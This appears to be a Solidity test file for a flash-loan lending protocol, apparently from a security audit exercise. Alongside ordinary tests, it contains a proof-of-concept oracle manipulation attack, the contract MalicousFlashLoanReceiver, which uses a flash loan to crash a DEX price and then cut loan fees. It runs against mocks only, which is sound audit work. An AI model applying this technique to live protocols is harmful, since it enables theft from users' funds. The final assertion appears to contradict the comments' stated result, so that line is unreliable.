// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT_10e18 = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT_10e18 * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT_10e18);
        tokenA.approve(address(thunderLoan), AMOUNT_10e18);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT_10e18);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT_10e18);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT_10e18);
        thunderLoan.deposit(tokenA, AMOUNT_10e18);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT_10e18);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT_10e18);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT_10e18 * 10; // q why * 10?
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT_10e18);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT_10e18);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT_10e18 - calculatedFee);
    }

    function testOracleManipulation() public {
        // 1. setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // create a TSwap DEX between WETH and tokenA
        address tswapPool = pf.createPool(address(tokenA));
        // we use the proxy address as the thunderLoan contract address
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. fund TSwap DEX
        vm.startPrank(liquidityProvider); // create an investor
        tokenA.mint(liquidityProvider, 100e18); // create investor balance
        assertEq(tokenA.balanceOf(liquidityProvider), 100e18);
        tokenA.approve(address(tswapPool), 100e18); // Approve the TSwap contract to spend tokens
        weth.mint(address(liquidityProvider), 100e18); // create weth balance
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        // Ratio 100 weth & 100 tokenA
        // price 1:1
        assert(weth.balanceOf(address(tswapPool)) == 100e18);
        assert(tokenA.balanceOf(address(tswapPool)) == 100e18);

        // 3. fund thunderLoan (pool)
        // set tokenA as an allowed token on thunderLoan
        vm.prank(thunderLoan.owner()); // create owner permission
        thunderLoan.setAllowedToken(tokenA, true); // greenlight tokenA
        // fund
        tokenA.mint(liquidityProvider, 1000e18); // create investor balance
        assertEq(tokenA.balanceOf(liquidityProvider), 1000e18);

        vm.startPrank(liquidityProvider); // have the investor do:...
        tokenA.approve(address(thunderLoan), 1000e18); // approve for transfer
        thunderLoan.deposit(tokenA, 1000e18); // deposit
        vm.stopPrank();

        // 100 weth & 100 tokenA in Tswap
        // 1000 tokenA in ThunderLoan  (to be borrowed from)
        // take out a flash loan of 50 tokenA
        // swap it on the DEX tanking the price: 150 weth -> ~80 tokenA
        // take out another flash loan of 50 tokenA (and we'll see how much cheaper it is)

        // 4. take out 2 flashloans

        // a. to nuke the price of the weth/Atoken on Tswap
        // b. to show that doing so greatly reduces the fees we pay on thunderloan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("normal fee is: ", normalFeeCost, " weth");
        // should give: 0.296147410319118389 weth

        uint256 amountToBorrow = 50e18;
        MalicousFlashLoanReceiver flr = new MalicousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 50e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("attack fee is: ", attackFee, " weth");
        assert(normalFeeCost < attackFee);
    }

    function testConsoleLog() public view {
        console.log("hello world");
    }
}

contract MalicousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked = false;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }
    // the flashloan receiver (interface) so if we call thunderloan.flashloan() this runs:

    function executeOperation(
        address token, // the token that's being borrowed
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. swap tokenA borrowed for weth
            // 2. take out ANOTHER flash loan, to show the difference in fees
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // tanks the price!!
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // we call a second flashloan, so we can see how much cheaper it is
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.repay(IERC20(token), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.repay(IERC20(token), amount + fee);
        }
        return true;
    }
}
